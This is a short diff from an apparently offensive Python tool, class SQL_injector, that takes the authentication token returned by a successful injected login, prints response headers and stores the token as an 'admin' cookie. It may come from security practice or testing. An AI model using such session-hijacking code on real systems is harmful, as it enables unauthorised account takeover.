@@ -43,11 +43,8 @@ class SQL_injector(a.attack_inter):
             if response.status_code == 200:
                 res_payload_dict = response.json()
                 print("Valid script: ", json_data['email'])
-                print(res_payload_dict)
-                
                 new_token = res_payload_dict["authentication"]['token']
-                print(new_token)
-
+                print(response.headers)
                 new_cookie = a.COOKIE
                 new_cookie["token"] = new_token
-                a.write_cookie(new_cookie)
+                a.write_cookie('admin',new_cookie)
